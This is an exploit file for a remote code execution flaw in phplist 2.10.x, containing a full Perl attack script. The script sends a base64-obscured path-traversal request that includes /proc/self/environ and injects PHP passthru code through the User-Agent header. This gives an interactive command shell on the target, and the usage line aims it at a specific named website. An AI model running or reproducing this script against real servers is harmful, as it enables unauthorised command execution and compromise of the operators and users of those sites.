# phplist 2.10.x remote code execution
# Credit:AmnPardaz Security Research Team for the vuln
# exploit author mozi2weed@yahoo.com
#
# Poc
#[root@server pentest]# perl phplistrce.pl http://www.helpcenter.it/list/

Exploit Code:
[root@server pentest]# cat phplistrce.pl
#!/usr/bin/perl -w
use strict;
use LWP 5.64;
use LWP::UserAgent;
use MIME::Base64;


print "phplist 2.10.x 0day RCE may b others by ";

my $browser = LWP::UserAgent->new;
my $url1 = $ARGV[0];
my ($line,$response);


my $url .= "L2FkbWluL2luZGV4LnBocD9fU0VSVkVSW0NvbmZpZ0ZpbGVdPS4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3Byb2Mvc2VsZi9lbnZpcm9u";
my $decode = decode_base64($url);

my $all = $url1.$decode;

print "mozi: ";
while( $line = <STDIN>) {
chop($line);
$browser->agent("mozi<?passthru('$line 2> /dev/stdout');?>mozi");
$response = $browser->get( $all );
if ($response->content =~ /mozi(.*)mozi/s) {
print $1;
}
print "mozi: ";
}